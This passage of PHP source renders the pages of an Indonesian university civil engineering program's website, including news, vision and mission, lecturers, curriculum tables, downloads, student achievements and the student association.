                        $kondisiinfonya = ["Kode = '19'","KategoriInformasi = '$kateg'"];
                        $datainfonya = $data->getDataFromTable($tbpageinfo, $fieldspage, $orderBypage, $limitinfonya, $kondisiinfonya, $distinctinfonya);
                        if (!empty($datainfonya)){
                        foreach ($datainfonya as $row2):
                            $kateg = htmlspecialchars($row2["KategoriInformasi"]);
                            $jdl = htmlspecialchars($row2["JudulInformasi"]);
                            $tgl = htmlspecialchars($row2["TanggalInformasi"]);
                            $url = htmlspecialchars($row2["URL"]);
                            if($tgl <= $datenow){
                        echo'
                            <li class="list-group-item pt-2 pb-2">
                                <a href="'.BASE_URL.strtolower($kateg).'/'.substr($tgl,0,4).'/'.$url.'"><p class="mb-0 w-100 small">'.$jdl.'</p></a>
                                <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tgl).'</small>
                            </li>';
                            }
                        endforeach;
                        }else{
                            echo'
                            <li class="list-group-item pt-2 pb-2 mt-3">
                                <p class="text-center">Belum ada Beasiswa</p>
                            </li>';
                        }
                        echo'
                        </ul>
                        <div class="card-footer text-center text-uppercase text-muted small">
                            <a href="'.BASE_URL.strtolower($kateg).'"><i class="fa fa-chevron-right"></i> Selengkapnya...</a>
                        </div>
                    </div>';
                endforeach;
                echo'
                </div>
            </div>
        </div>
    </section>';

}

function berita_program_studi(){

    $datenow = date('Y-m-d H:i:s');

    $data = new Data();

    $tbberitapage = 'tb_berita';
    $fieldsberitapage = ['NamaBerita', 'KeteranganBerita', 'PenulisBerita', 'TanggalBerita', 'MenuBerita', 'FotoBerita', 'URL'];
    $kondisiberitapage = ["Kode = '19'"];
    $orderByberitapage = 'TanggalBerita DESC, IdBerita DESC';
    $pageberitapage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
    $limitberitapage = 6;
    $databeritapage = $data->getDataFromTablePage($tbberitapage, $fieldsberitapage, $kondisiberitapage, $orderByberitapage, $pageberitapage, $limitberitapage);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="text-center">
                <p class="mb-5 judulred">Berita Program Studi</p>
            </div>
            <div class="row">';
            foreach ($databeritapage as $row):
                $nmber = htmlspecialchars($row["NamaBerita"]);
                $tulber = htmlspecialchars($row["PenulisBerita"]);
                $tglber = htmlspecialchars($row["TanggalBerita"]);
                $menber = htmlspecialchars($row["MenuBerita"]);
                $badgeClass = "";
                switch ($menber) {
                    case "Kemahasiswaan":
                        $badgeClass = "badge-secondary";
                        break;
                    case "Kemuhammadiyahan":
                        $badgeClass = "badge-success";
                        break;
                    case "Kerjasama":
                        $badgeClass = "badge-danger";
                        break;
                    case "Prestasi":
                        $badgeClass = "badge-warning";
                        break;
                    case "Tri Dharma":
                        $badgeClass = "badge-primary";
                        break;
                    default:
                        $badgeClass = "";
                        break;
                }
                $fotber = htmlspecialchars($row["FotoBerita"]);
                $urlber = htmlspecialchars($row["URL"]);
                if($tglber <= $datenow){
                    echo'
                <div class="col-lg-6 col-md-12 mb-4">
                    <div class="row">
                        <div class="col-5 text-center">
                            <img src="' . BASE_URL . '/img/berita/' . $fotber . '" class="img-fluid img-thumbnail rounded-lg" width="210" alt="" loading="lazy">
                        </div>
                        <div class="col-7">
                            <p class="small mb-1"><i class="fa fa-calendar pink-text"></i> <span class="pink-text">' . tanggal_indo($tglber) . '</span> | <i class="fa fa-edit pink-text"></i> <span class="pink-text">' . $tulber . '</span></p>';
                            if (!empty($badgeClass)):
                                echo'
                                <p class="mb-1"><span class="badge ' . $badgeClass . ' text-uppercase">' . $menber . '</span></p>';
                            endif;
                            echo'
                            <p class="font-weight-bold text-justify mb-1">' . $nmber . '</p>
                            <a href="' . BASE_URL . str_replace(' ','_',strtolower($menber)) . "/" . substr($tglber,0,4) . "/" . $urlber.'">Selengkapnya <i class="fa fa-angle-double-right"></i></a>
                        </div>
                    </div>
                </div>';
                }
            endforeach;
                echo'
            </div>';
            $kodearr = [
                "Kode = '19'",
            ];
            $selectQuery = "SELECT COUNT(*) AS IdBerita FROM tb_berita WHERE " . implode(' AND ', $kodearr);
            $baseURL = BASE_URL . 'berita_program_studi/';
            $get_jumlah = 'IdBerita';
            $paginationHtml = $data->generatePagination($pageberitapage, $limitberitapage, $kodearr, $selectQuery, $baseURL, $get_jumlah);
            echo $paginationHtml;
        echo'
        </div>
    </section>';

}

function visi_misi_tujuan(){

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Profil</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Visi, Misi dan Tujuan</li>
                    </ol>
                </nav>
            </div>
            <div class="row">
                <!--<div class="col-md-3">
                    <ul class="list-group">
                        <li class="list-group-item active">Visi, Misi & Tujuan <i class="fa fa-chevron-circle-right float-right" aria-hidden="true"></i></li>
                        <li class="list-group-item">Struktur Organisasi <i class="fa fa-minus-square float-right" aria-hidden="true"></i></li>
                        <li class="list-group-item">Dosen <i class="fa fa-minus-square float-right" aria-hidden="true"></i></li>
                        <li class="list-group-item">Fasilitas <i class="fa fa-minus-square float-right" aria-hidden="true"></i></li>
                    </ul>-->
                </div>
                <div class="col-md-12">
                    <h3 class="text-uppercase text-center">Visi</h3>
                    <p class="text-center">“Terwujudnya pengembangan inovasi rekayasa ketekniksipilan yang unggul untuk Menghasilkan Sumber Daya Manusia yang Sejahtera berbasis Kewirausahaan Digital pada Tahun 2044”</p>

                    <h3 class="text-uppercase text-center">Misi</h3>
                    <ol class="text-justify">
                    <li>Menyelenggarakan pendidikan teknik sipil yang menghasilkan sarjana unggul dan bedaya saing dengan mengintegrasikan nilai religius dan budaya bugis.</li>
                    <li>Mempunyai wawasan keilmuan yang ilmiah, profesional, dan kompetitif di bidang rekayasa ketekniksipilan.</li>
                    <li>Melaksanakan kegiatan penelitian berdasarkan roadmap yang terintegrasi pada pengembangan kompetensi spesifikasi keilmuan.</li>
                    <li>Meningkatkan kualitas, integritas moral yang tinggi serta mampu bekerjasama, berinovasi, kreatif dan profesional dalam bidang teknik sipil yang bercirikan kekhasan daerah.</li>
                    <li>Meningkatkan hubungan kerjasama strategis dengan mitra pada program pengembangan infrastruktur wilayah guna menciptakan Sumber Daya Manusia yang Sejahtera berbasis Kewirausahaan Digital.</li>
                    </ol>

                    <h3 class="text-uppercase text-center">Tujuan</h3>
                    <ol class="text-justify">
                    <li>Menghasilkan lulusan yang religius/ islami dan berkualitas di bidang teknik sipil.</li>
                    <li>Menghasilkan lulusan yang mampu mengaplikasikan ilmu pengetahuan di bidang perencanaan, pengawasan dan pembangunan infrastruktur.</li>
                    <li>Menghasilkan lulusan yang berorientasi pada kebutuhan masyarakat dan pengembangan daerah secara profesional, inovatif, kreatif serta mampu bekerjasama.</li>
                    <li>Menghasilkan lulusan yg memiliki kompetensi sesuai dengan kebutuhan dunia kerja.</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>';
}

function struktur_organisasi(){

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Profil</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Struktur Organisasi</li>
                    </ol>
                </nav>
            </div>
            <div class="row">
                <div class="text-center mx-3">
                    <img src="'.BASE_URL.'img/struk_ts.jpg" class="img-fluid img-thumbnail" alt="Bagan Struktur">
                </div>
            </div>
        </div>
    </section>';
}

function dosen_program_studi(){

    $data = new Data();

    $tbdosen = 'tb_dosen';
    $fieldsdosen = ['NamaDosen', 'Strata1', 'Strata2', 'Strata3', 'Email', 'NIDN', 'IdSinta', 'IdScopus', 'JaFung', 'FotoDosen'];
    $orderbydosen = 'IdDosen ASC';
    $limitdosen = null;
    $kondisidosen = ["Kode = '19'"];
    $datadosen = $data->getDataFromTable($tbdosen, $fieldsdosen, $orderbydosen, $limitdosen, $kondisidosen);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Profil</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Dosen Program Studi</li>
                    </ol>
                </nav>
            </div>
            <div class="row mt-5">
                <div class="modal fade" id="detaildatadosen" tabindex="-1" data-backdrop="static" role="dialog" aria-hidden="true">
                    <div class="modal-dialog modal-lg cascading-modal" role="document">
                        <div class="modal-content">
                            <div class="modal-c-tabs">
                                <ul class="nav nav-tabs md-tabs headnav-1" role="tablist">
                                    <li class="text-center text-white h5 my-2">
                                        <span id="namadosen"></span>
                                    </li>
                                </ul>
                                <div class="modal-body table-responsive" id="viewdatadosen">
                                </div>
                                <div class="modal-footer">
                                    <button type="button" class="btn btn-danger btn-sm" data-dismiss="modal" data-toggle="modal"><i class="fa fa-times"></i> Tutup</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>';
            foreach ($datadosen as $row):
                $nmdos = htmlspecialchars($row["NamaDosen"]);
                $nidn = htmlspecialchars($row["NIDN"]);
                $fildos = htmlspecialchars($row["FotoDosen"]);
                echo'
                <div class="col-lg-4 col-md-12 my-5">
                    <div class="card testimonial-card">
                        <div class="avatar mx-auto white">
                            <img src="' . BASE_URL . 'img/dosen/' . $fildos . '" alt="' . $nmdos . '" class="rounded-circle img-fluid">
                        </div>
                        <div class="card-body">
                            <h4 class="card-title mt-1 mb-1"><span class="badge badge-danger" style="border-radius: 6px;">' . $nmdos . '</span></h4>
                            <p class="font-weight-bold">NIDN. ' . $nidn . '</p>
                            <button type="button" class="btn btn-light btn-sm" onclick="detaildatadosen(\''.$fildos.'\',\''.str_replace(['"', '\''], ['^', '*'], $nmdos).'\')" data-toggle="modal" data-target="#detaildatadosen"><i class="fa fa-eye"></i> Selengkapnya</button>
                        </div>
                    </div>
                </div>';
            endforeach;
            echo'
            </div>
        </div>
    </section>';
}

function fasilitas(){

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Profil</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Fasilitas</li>
                    </ol>
                </nav>
            </div>
            <h2 class="card-title py-1 text-center text-uppercase">Fasilitas</h2>
            <div class="row">

            </div>
        </div>
    </section>';
}

function kalender_akademik(){

    $data = new Data();

    $tbkalenderakademik = 'tb_kalender_akademik';
    $fieldskalenderakademik = ['Kategori', 'TahunAkademik', 'UnggahFile'];
    $orderbykalenderakademik = 'IdKalenderAkademik ASC, TahunAkademik ASC';
    $limitkalenderakademik = null;
    $kondisikalenderakademik = ["Kode = '19'"];
    $datakalenderakademik = $data->getDataFromTable($tbkalenderakademik, $fieldskalenderakademik, $orderbykalenderakademik, $limitkalenderakademik, $kondisikalenderakademik);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Kalender Akademik</li>
                    </ol>
                </nav>
            </div>
            <div class="row">
                <div class="cil-md-12">
                    <ul class="text-justify h5" style="list-style-type: square;">';
                    foreach ($datakalenderakademik as $row):
                        $kate = htmlspecialchars($row["Kategori"]);
                        $ta = htmlspecialchars($row["TahunAkademik"]);
                        $filedok = htmlspecialchars($row["UnggahFile"]);
                        echo'
                        <li class="my-3"><a href="'.BASE_URL.'img/dokumen/'.$filedok.'" target="_blank"><i class="fa fa-file-pdf-o fa-lg text-danger" aria-hidden="true"></i> Kalender Akademik T.A. '.$ta.' ('.$kate.')</a></li>';
                    endforeach;
                    echo'
                    </ul>
                </div>
            </div>
        </div>
    </section>';
}

// function panduan_akademik(){

//     echo'
//     <section class="bg-batik">
//         <div class="container py-4">
//             <div class="bc-icons-2">    
//                 <nav aria-label="breadcrumb">
//                     <ol class="breadcrumb orange lighten-4">
//                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
//                         <li class="breadcrumb-item active">Panduan Akademik</li>
//                     </ol>
//                 </nav>
//             </div>
//             <h2 class="card-title py-1 text-center text-uppercase">Panduan Akademik</h2>
//             <div class="row">

//             </div>
//         </div>
//     </section>';
// }

function struktur_kurikulum(){

    $data = new Data();

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Struktur Kurikulum</li>
                    </ol>
                </nav>
            </div>
            <div class="row justify-content-center">
                <div class="col-md-12">
                    <div class="accordion md-accordion" id="accordionEx" role="tablist" aria-multiselectable="true">';
                    $smt = array("Gasal","Genap","Pilihan");
                    $nomrnya=1;
                    $tampil = ' show';
                    $collapse = '';
                    $iconup = 'true';
                    foreach ($smt as $semester):
                        $semesterTitles = [
                            "Gasal" => "Matakuliah Semester Gasal",
                            "Genap" => "Matakuliah Semester Genap",
                            "Pilihan" => "Matakuliah Pilihan",
                        ];
                        $jdl = $semesterTitles[$semester] ?? "";                        
                    echo'
                        <div class="card headnav-1">
                            <div class="card-header" role="tab" id="heading'.$nomrnya.'">
                                <a'.$collapse.' data-toggle="collapse" data-toggle="collapse" data-parent="#accordionEx" href="#collapse'.$nomrnya.'" aria-expanded="'.$iconup.'" aria-controls="collapse'.$nomrnya.'">
                                    <h6 class="mb-0 h6 headnav-1 text-white text-uppercase">
                                        '.$jdl.' <i class="fa fa-angle-down rotate-icon"></i>
                                    </h6>
                                </a>
                            </div>
                            <div id="collapse'.$nomrnya.'" class="collapse'.$tampil.'" role="tabpanel" aria-labelledby="heading'.$nomrnya.'"
                                data-parent="#accordionEx">
                                <div class="card">
                                    <div class="card-body table-responsive">
                                        <table class="table table-bordered table-hover text-nowrap" cellspacing="0" width="100%">
                                            <thead class="headnav-2 white-text text-center">
                                                <tr>
                                                    <th>No.</th>
                                                    <th>Kode MK</th>
                                                    <th>Matakuliah</th>
                                                    <th>SKS</th>
                                                </tr>
                                            </thead>
                                            <tbody>';
                                            $semesterMappings = [
                                                "Gasal" => ["I", "III", "V", "VII"],
                                                "Genap" => ["II", "IV", "VI", "VIII"],
                                                "Pilihan" => ["Pilih"],
                                            ];
                                            $smtnya = $semesterMappings[$semester] ?? [];
                                            $wheresmt = "Semester IN ('" . implode("', '", $smtnya) . "')";                                            
                                            $tbstrukkuri = 'tb_struktur_kurikulum';
                                            $fieldsstrukkuri = ['Semester', 'KodeMK', 'NamaMK', 'SKSMK', 'FileRPS'];
                                            $orderbystrukkuri = 'Semester ASC, IdStrukturKurikulum ASC';
                                            $limitstrukkuri = null;
                                            $kondisistrukkuri = [
                                                "Kode = '19'",
                                                $wheresmt,
                                            ];
                                            $datastrukkuri = $data->getDataFromTable($tbstrukkuri, $fieldsstrukkuri, $orderbystrukkuri, $limitstrukkuri, $kondisistrukkuri);
                                            $no=1;
                                            $urut=1;
                                            $btssmt = '';
                                            foreach ($datastrukkuri as $row2):
                                                $smtnya = htmlspecialchars($row2["Semester"]);
                                                $kdmk = htmlspecialchars($row2["KodeMK"]);
                                                $nmmk = htmlspecialchars($row2["NamaMK"]);
                                                $sks = htmlspecialchars($row2["SKSMK"]);
                                                // $file = htmlspecialchars($row2["FileRPS"]);
                                                if($semester=="Gasal" || $semester=="Genap"){
                                                    if ($btssmt != $smtnya){
                                                        echo '<tr>
                                                                <td class="text-center font-weight-bold" colspan="5">SEMESTER '.$smtnya.'</td>
                                                            </tr>';
                                                        $btssmt = $smtnya;
                                                        $urut=1;
                                                    }
                                                }
                                                
                                            echo'
                                                <tr>
                                                    <td class="text-center py-1">'.$urut.'.</td>
                                                    <td class="text-center py-1">'.$kdmk.'</td>
                                                    <td class="py-1">'.$nmmk.'</td>
                                                    <td class="text-center py-1">'.$sks.'</td>
                                                </tr>';
                                                $no++;
                                                $urut++;
                                            endforeach;
                                            echo'
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>';
                        $nomrnya++;
                        $tampil='';
                        $collapse=' class="collapsed"';
                        $iconup="false";
                    endforeach;
                    echo'
                    </div>
                </div>
            </div>
        </div>
    </section>';
}

function capstone_design(){

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Capstone Design</li>
                    </ol>
                </nav>
            </div>
            <h2 class="card-title py-1 text-center text-uppercase">Capstone Design</h2>
            <div class="row">

            </div>
        </div>
    </section>';
}

// function capaian_pembelajaran_lulusan(){

//     echo'
//     <section class="bg-batik">
//         <div class="container py-4">
//             <div class="bc-icons-2">    
//                 <nav aria-label="breadcrumb">
//                     <ol class="breadcrumb orange lighten-4">
//                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
//                         <li class="breadcrumb-item active">Capaian Pembelajaran Lulusan</li>
//                     </ol>
//                 </nav>
//             </div>
//             <h2 class="card-title py-1 text-center text-uppercase">Capaian Pembelajaran Lulusan</h2>
//             <div class="row">

//             </div>
//         </div>
//     </section>';
// }

function download(){

    $data = new Data();

    $tbdownload = 'tb_download';
    $fieldsdownload = ['NamaDownload', 'FileDownload'];
    $orderbydownload = 'Iddownload ASC';
    $limitdownload = null;
    $kondisidownload = ["Kode = '19'"];
    $datadownload = $data->getDataFromTable($tbdownload, $fieldsdownload, $orderbydownload, $limitdownload, $kondisidownload);

    $file_ext = array('rar', 'zip', 'pdf', 'docx', 'doc');
    $file_img = array(
        '<i class="fa fa-file-archive-o text-secondary"></i> ',
        '<i class="fa fa-file-archive-o text-warning"></i> ',
        '<i class="fa fa-file-pdf-o text-danger"></i> ',
        '<i class="fa fa-file-word-o text-primary"></i> ',
        '<i class="fa fa-file-word-o text-primary"></i> '
    );

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Akademik</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Download</li>
                    </ol>
                </nav>
            </div>
            <div class="row">
                <div class="col-md-12">
                    <ol class="text-justify">';
                    foreach ($datadownload as $row):
                        $nmdok = htmlspecialchars($row["NamaDownload"]);
                        $filedok = htmlspecialchars($row["FileDownload"]);

                        $file_info = pathinfo($filedok);
                        $extension = strtolower($file_info['extension']);
                        $index = array_search($extension, $file_ext);
                        if ($index !== false && isset($file_img[$index])) {
                            $file_icon = $file_img[$index];
                        } else {
                            $file_icon = '<i class="fa fa-file"></i> ';
                        }
                        echo '
                            <li>' . $file_icon . $nmdok . ' <a href="' . BASE_URL . 'img/download/' . $filedok . '" target="_blank" download="' . $nmdok . '"><i class="fa fa-download" aria-hidden="true"></i> Download</a></li>';
                    endforeach;
                    echo'
                    </ol>
                </div>
            </div>
        </div>
    </section>';
}


function prestasi_mahasiswa(){

    $data = new Data();

    $tbpremhs = 'tb_prestasi_mahasiswa';
    $fieldspremhs1 = null;
    $orderbypremhs = 'KategoriPrestasi ASC, IdPrestasiMahasiswa ASC';
    $distinctpremhs1 = "KategoriPrestasi";
    $limitpremhs = null;
    $kondisipremhs1 = ["Kode = '19'"];
    $datapremhs1 = $data->getDataFromTable($tbpremhs, $fieldspremhs1, $orderbypremhs, $limitpremhs, $kondisipremhs1, $distinctpremhs1);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Mahasiswa & Alumni</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Prestasi Mahasiswa</li>
                    </ol>
                </nav>
            </div>
            <div class="row justify-content-center">
                <div class="col-md-12">
                    <div class="accordion md-accordion" id="accordionEx" role="tablist" aria-multiselectable="true">';
                    $nomrnya=1;
                    $tampil = ' show';
                    $collapse = '';
                    $iconup = 'true';
                    foreach ($datapremhs1 as $row1):
                        $kateg = htmlspecialchars($row1["KategoriPrestasi"]);
                    echo'
                        <div class="card headnav-1">
                            <div class="card-header" role="tab" id="heading'.$nomrnya.'">
                                <a'.$collapse.' data-toggle="collapse" data-toggle="collapse" data-parent="#accordionEx" href="#collapse'.$nomrnya.'" aria-expanded="'.$iconup.'" aria-controls="collapse'.$nomrnya.'">
                                    <h6 class="mb-0 h6 headnav-1 text-white text-uppercase">
                                        '.strtoupper($kateg).' <i class="fa fa-angle-down rotate-icon"></i>
                                    </h6>
                                </a>
                            </div>
                            <div id="collapse'.$nomrnya.'" class="collapse'.$tampil.'" role="tabpanel" aria-labelledby="heading'.$nomrnya.'"
                                data-parent="#accordionEx">
                                <div class="card">
                                    <div class="card-body table-responsive">
                                        <table class="table table-bordered table-hover text-nowrap" cellspacing="0" width="100%">
                                            <thead class="headnav-2 white-text text-center">
                                                <tr>
                                                    <th>No.</th>
                                                    <th>Kegiatan</th>
                                                    <th>Peserta</th>
                                                    <th>Tahun</th>
                                                    <th>Tingkat</th>
                                                    <th>Prestasi</th>
                                                </tr>
                                            </thead>
                                            <tbody>';
                                            $fieldspremhs2 = ['KategoriPrestasi', 'Kegiatan', 'Peserta', 'Tahun', 'Tingkat', 'Prestasi'];
                                            $distinctpremhs2 = null;
                                            $kondisipremhs2 = ["KategoriPrestasi = '$kateg'", "Kode = '19'"];
                                            $datapremhs2 = $data->getDataFromTable($tbpremhs, $fieldspremhs2, $orderbypremhs, $limitpremhs, $kondisipremhs2, $distinctpremhs2);
                                            $no=1;
                                            foreach ($datapremhs2 as $row2):
                                                $kegpremhs = htmlspecialchars($row2["Kegiatan"]);
                                                $psrtpremhs = htmlspecialchars($row2["Peserta"]);
                                                $thnpremhs = htmlspecialchars($row2["Tahun"]);
                                                $tngktpremhs = htmlspecialchars($row2["Tingkat"]);
                                                $prestspremhs = htmlspecialchars($row2["Prestasi"]);
                                            echo'
                                                <tr>
                                                    <td class="py-1">'.$no.'.</td>
                                                    <td class="py-1">'.$kegpremhs.'</td>
                                                    <td class="py-1">'.$psrtpremhs.'</td>
                                                    <td class="py-1">'.$thnpremhs.'</td>
                                                    <td class="py-1">'.$tngktpremhs.'</td>
                                                    <td class="py-1">'.$prestspremhs.'</td>
                                                </tr>';
                                                $no++;
                                            endforeach;
                                            echo'
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>';
                        $nomrnya++;
                        $tampil='';
                        $collapse=' class="collapsed"';
                        $iconup="false";
                    endforeach;
                    echo'
                    </div>
                </div>
            </div>
        </div>
    </section>';
}

function himpunan_mahasiswa(){

    $data = new Data();

    $tbhimp = 'tb_himpunan';
    $fieldshimp = ['NamaHimpunan', 'Keterangan', 'Logo', 'Struktur'];
    $orderbyhimp = null;
    $distincthimp = null;
    $limithimp = null;
    $kondisihimp = ["Kode = '19'", "Logo='hms.jpg'"];
    $datahimp = $data->getDataFromTable($tbhimp, $fieldshimp, $orderbyhimp, $limithimp, $kondisihimp, $distincthimp);

    $tbpengurushimp = 'tb_himpunan_pengurus';
    $fieldspengurushimp = ['Periode', 'Ketua', 'WakilKetua'];
    $orderbypengurushimp = 'IdPengurusHimpunan DESC';
    $distinctpengurushimp = null;
    $limitpengurushimp = null;
    $kondisipengurushimp = ["Kode = '19'"];
    $datapengurushimp = $data->getDataFromTable($tbpengurushimp, $fieldspengurushimp, $orderbypengurushimp, $limitpengurushimp, $kondisipengurushimp, $distinctpengurushimp);

    $tbkeghimp = 'tb_himpunan_kegiatan';
    $fieldskeghimp = ['Judul', 'Keterangan', 'FotoFile'];
    $orderbykeghimp = 'IdKegiatanHimpunan DESC';
    $limitkeghimp = 10;
    $kondisikeghimp = ["Kode = '19'"];
    $datakeghimp = $data->getDataFromTable($tbkeghimp, $fieldskeghimp, $orderbykeghimp, $limitkeghimp, $kondisikeghimp);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="bc-icons-2">    
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb orange lighten-4">
                        <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Mahasiswa & Alumni</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
                        <li class="breadcrumb-item active">Himpunan Mahasiswa</li>
                    </ol>
                </nav>
            </div>';
            foreach ($datahimp as $row1):
                $nmhimp = htmlspecialchars($row1["NamaHimpunan"]);
                $kethimp =$row1["Keterangan"];
                $loghimp = $row1["Logo"];
                echo'
            <div class="row">
                <div class="col-md-4 text-center mb-3">
                    <img src="'.BASE_URL.'img/himpunan/'.$loghimp.'" class="img-fluid img-thumbnail w-75" alt="" loading="lazy">
                </div>
                <div class="col-md-8">
                    <p class="judulred">'.$nmhimp.'</p>
                    '.$kethimp.'
                </div>
            </div>';
            endforeach;
        echo'
        </div>
    </section>
    
    <section class="headnav-2">
        <div class="container py-5">
            <div class="row">
                <div class="col-md-6 text-center mb-3">';
                foreach ($datahimp as $row2):
                    $strukhimp = htmlspecialchars($row2["Struktur"]);
                    echo'
                    <img src="'.BASE_URL.'img/himpunan/'.$strukhimp.'" class="img-fluid img-thumbnail" alt="" loading="lazy">';
                endforeach;
                echo'
                </div>
                <div class="col-md-6">
                    <p class="judulred">Kepengurusan HMS</p>
                    <div class="accordion md-accordion" id="accordionEx" role="tablist" aria-multiselectable="true">';
                    $nomrnya=1;
                    $tampil = ' show';
                    $collapse = '';
                    $iconup = 'true';
                    foreach ($datapengurushimp as $row):
                        $periode = htmlspecialchars($row["Periode"]);
                        $ketua = htmlspecialchars($row["Ketua"]);
                        $wketua = htmlspecialchars($row["WakilKetua"]);
                    echo'
                        <div class="card headnav-1">
                            <div class="card-header" role="tab" id="heading'.$nomrnya.'">
                                <a'.$collapse.' data-toggle="collapse" data-toggle="collapse" data-parent="#accordionEx" href="#collapse'.$nomrnya.'" aria-expanded="'.$iconup.'" aria-controls="collapse'.$nomrnya.'">
                                    <h6 class="mb-0 h6 headnav-1 text-white text-uppercase">
                                        Periode '.$periode.' <i class="fa fa-angle-down rotate-icon"></i>
                                    </h6>
                                </a>
                            </div>
                            <div id="collapse'.$nomrnya.'" class="collapse'.$tampil.'" role="tabpanel" aria-labelledby="heading'.$nomrnya.'"
                                data-parent="#accordionEx">
                                <div class="card">
                                    <div class="card-body py-0 table-responsive">
                                        <table class="table text-nowrap">
                                            <tr>
                                                <td width="22%" class="py-2">Ketua</td>
                                                <td width="1%" class="py-2">:</td>
                                                <td class="font-weight-bold py-2">'.$ketua.'</td>
                                            </tr>
                                            <tr>
                                                <td class="py-2">Sekertaris</td>
                                                <td class="py-2">:</td>
                                                <td class="font-weight-bold py-2">'.$wketua.'</td>
                                            </tr>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>';
                        $nomrnya++;
                        $tampil='';
                        $collapse=' class="collapsed"';
                        $iconup="false";
                    endforeach;
                    echo'
                </div>
            </div>
        </div>
    </section>
    
    <section class="bg-batik">
        <div class="container py-4">
            <div class="responsive1 slider">';
            foreach ($datakeghimp as $row):
                $judul = htmlspecialchars($row["Judul"]);
                $keterangan = $row["Keterangan"];
                $foto = $row["FotoFile"];
                echo'
                <div class="items">
                    <div class="row">
                        <div class="col-md-6 mb-3">
                            <img src="' . BASE_URL . '/img/himpunan/' . $foto . '" class="img-fluid img-thumbnail rounded-lg" alt="" loading="lazy">
                        </div>
                        <div class="col-md-6">
                            <p class="judulred">Kegiatan HMS</p>
                            <div class="car-text">
                                <h5>'.$judul.'</h5>
                                <p class="text-justify my-4">'.$keterangan.'</p>
                            </div>
                        </div>
                    </div>
                </div>';
                endforeach;
            echo'
            </div>
        </div>
    </section>';
}

// function komunitas_mahasiswa(){

//     $data = new Data();

//     $tbkomunitasmhs = 'tb_komunitas_kegiatan';
//     $fieldskomunitasmhs1 = null;
//     $orderbykomunitasmhs = 'IdKegiatanKomunitas ASC';
//     $distinctkomunitasmhs1 = "Komunitas";
//     $limitkomunitasmhs = null;
//     $kondisikomunitasmhs1 = ["Kode = '19'"];
//     $datakomunitasmhs1 = $data->getDataFromTable($tbkomunitasmhs, $fieldskomunitasmhs1, $orderbykomunitasmhs, $limitkomunitasmhs, $kondisikomunitasmhs1, $distinctkomunitasmhs1);

//     echo'
//     <section class="bg-batik">
//         <div class="container py-4">
//             <div class="bc-icons-2">    
//                 <nav aria-label="breadcrumb">
//                     <ol class="breadcrumb orange lighten-4">
//                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Mahasiswa & Alumni</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
//                         <li class="breadcrumb-item active">Komunitas Mahasiswa</li>
